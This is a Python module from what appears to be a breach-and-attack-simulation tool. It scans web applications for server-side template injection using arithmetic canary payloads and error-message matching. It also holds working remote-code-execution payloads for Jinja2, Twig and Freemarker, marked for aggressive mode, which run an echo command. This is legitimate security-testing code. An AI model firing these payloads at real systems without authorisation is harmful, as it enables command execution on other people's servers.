"""
Server-Side Template Injection (SSTI) testing module.

Tests for template injection across multiple template engines:
Jinja2, Twig, Freemarker, Velocity, Mako, Pebble, etc.

MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""

from __future__ import annotations

import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Mathematical canary payloads - each engine's result confirms the engine type
SSTI_DETECTION_PAYLOADS = [
    # Universal detection: 7*7=49
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "freemarker/velocity"),
    ("#{7*7}", "49", "ruby_erb/java_el"),
    ("<%= 7*7 %>", "49", "erb/ejs"),
    ("{{7*'7'}}", "7777777", "jinja2"),       # Jinja2 specific
    ("{{7*'7'}}", "49", "twig"),               # Twig returns 49
    # Engine-specific confirmation
    ("{{config}}", "<Config", "jinja2_config"),
    ("{{self}}", "TemplateReference", "jinja2_self"),
    ("${class.getClass()}", "java.lang", "java_el"),
    ("{{dump(app)}}", "Symfony", "twig_symfony"),
    # Polyglot
    ("${{<%[%'\"}}%\\.", "", "polyglot_error"),
]

# RCE payloads for confirmed SSTI (used in aggressive mode only)
SSTI_RCE_PAYLOADS = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('echo BAS_SSTI_{canary}').read()}}",
    ],
    "twig": [
        "{{['echo BAS_SSTI_{canary}']|filter('system')}}",
    ],
    "freemarker": [
        '${"freemarker.template.utility.Execute"?new()("echo BAS_SSTI_{canary}")}',
    ],
}


class SSTIModule(BaseAttackModule):
    """Server-Side Template Injection testing and detection."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="ssti",
            description="Server-Side Template Injection - multi-engine detection",
            category="ssti",
            mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-1336"],
            tags=["injection", "ssti", "rce", "template"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        # Use detection payloads first
        payloads = [p[0] for p in SSTI_DETECTION_PAYLOADS]

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("ssti", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", ["name", "template", "page", "view", "content", "message"])
        path = options.get("path", "/")

        for payload in payloads:
            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                requests.append(AttackRequest(
                    request_id=f"ssti-{req_id}",
                    target=target,
                    method=options.get("method", "GET"),
                    path=path,
                    params={param: payload},
                    headers={"X-BAS-Payload": payload},
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        original_payload = request.headers.get("X-BAS-Payload", payload)

        # Check each detection payload against expected result
        for test_payload, expected, engine in SSTI_DETECTION_PAYLOADS:
            if original_payload == test_payload and expected and expected in body:
                return ModuleResult(
                    module_name="ssti",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=original_payload,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SSTI confirmed: '{test_payload}' resolved to '{expected}' (engine: {engine})",
                    severity="critical",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "mathematical_canary", "engine": engine},
                )

        # Check for template engine error messages
        error_indicators = [
            ("jinja2.exceptions", "jinja2"),
            ("TemplateSyntaxError", "jinja2/django"),
            ("Twig_Error_Syntax", "twig"),
            ("freemarker.core", "freemarker"),
            ("velocity", "velocity"),
            ("mako.exceptions", "mako"),
            ("TemplateError", "generic"),
        ]
        for indicator, engine in error_indicators:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="ssti",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=original_payload,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Template engine error exposed: {indicator} (engine: {engine})",
                    severity="high",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "error_disclosure", "engine": engine},
                )

        return ModuleResult(
            module_name="ssti",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=original_payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
